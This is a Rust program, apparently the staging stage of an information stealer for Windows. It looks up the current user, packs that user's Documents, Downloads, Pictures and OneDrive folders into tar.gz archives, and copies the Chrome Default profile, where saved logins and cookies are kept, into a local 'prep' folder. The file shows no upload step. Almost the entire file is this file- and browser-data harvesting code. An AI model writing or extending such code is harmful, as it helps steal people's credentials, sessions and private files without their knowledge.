use std::fs;
use std::process::Command;

fn copy(path: &str) {
    if let Err(e) = fs::create_dir_all("prep/chrome_data") {
        eprintln!("[ERR07]");
        return;
    }

    let output = Command::new("cmd")
        .arg("/C")
        .arg(format!("xcopy \"{}\" \"prep\\chrome_data\\\" /E /I /Y", path))
        .output()
        .expect("[ERR08]");

    if !output.status.success() {
        eprintln!("[ERR09]");
    } else {
        println!("Chrome data copied");
    }
}

fn compressFolder(path: &str, archiveName: &str) {
    if let Err(e) = fs::create_dir_all("prep/targz") {
        eprintln!("[ERR06]");
        return;
    }

    let output = Command::new("tar")
        .arg("-c")  
        .arg("-z") 
        .arg("-f")  
        .arg(format!("prep\\targz\\{}.tar.gz", archiveName))
        .arg(path)
        .output()
        .expect("[ERR03]");

    if !output.status.success() {
        eprintln!("[ERR04]");
    } else {
        println!("Folder {} compressed", archiveName);
    }
}

fn main() {
    let user = Command::new("whoami")
        .output()
        .expect("[ERR05]");
    
    let username = String::from_utf8_lossy(&user.stdout).trim().to_string();
    let user_path = format!("C:\\Users\\{}\\", username);

    compressFolder(&format!("{}Documents", user_path), "docs");
    compressFolder(&format!("{}Downloads", user_path), "recentDownloads");
    compressFolder(&format!("{}Pictures", user_path), "desktop");
    compressFolder(&format!("{}OneDrive", user_path), "onedrive");

    copy(&format!("{}AppData\\Local\\Google\\Chrome\\User Data\\Default", user_path));

    fs::write("prep/user_data", &username).expect("[ERR10]");
}